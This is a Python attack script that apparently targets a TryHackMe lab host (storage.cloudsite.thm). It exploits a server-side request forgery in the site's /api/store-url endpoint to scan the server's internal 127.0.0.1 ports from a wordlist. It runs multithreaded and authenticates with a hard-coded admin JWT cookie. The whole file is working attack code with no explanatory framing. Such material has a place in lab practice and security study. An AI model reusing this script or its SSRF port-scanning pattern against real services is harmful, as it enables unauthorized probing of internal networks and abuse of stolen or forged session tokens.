import requests
import sys
from concurrent.futures import ThreadPoolExecutor

url = "http://storage.cloudsite.thm/api/store-url"
cookies = {
    "jwt": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQG1haWwuY29tIiwic3Vic2NyaXB0aW9uIjoiYWN0aXZlIiwiaWF0IjoxNzQwMjM4MzgwLCJleHAiOjE3NDAyNDE5ODB9.-y0m1w6kLPyRi5XsJp9_AcKGm4r7Hm_RPyikShziqeE"
}

def fuzz_dir(fuzz):
    data = {"url": f"http://127.0.0.1:{fuzz}/"}
    response = requests.post(url, json=data, cookies=cookies)
    
    if response.status_code == 200:
        try:
            json_response = response.json()
            print(f"[+] Open port fond: {fuzz}")
        except Exception as e:
            print(f"[-] Error parsing response: {e}")
    else:
        if response.status_code == 500:
            pass
        else:
            print(f"[-] Request failed with status {response.status_code}")

def fuzz_dirs(wordlist, max_threads=5):
    with open(wordlist, "r") as f, ThreadPoolExecutor(max_threads) as executor:
        executor.map(fuzz_dir, (line.strip() for line in f))

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <wordlist>")
        sys.exit(1)
    
    wordlist_path = sys.argv[1]
    fuzz_dirs(wordlist_path)
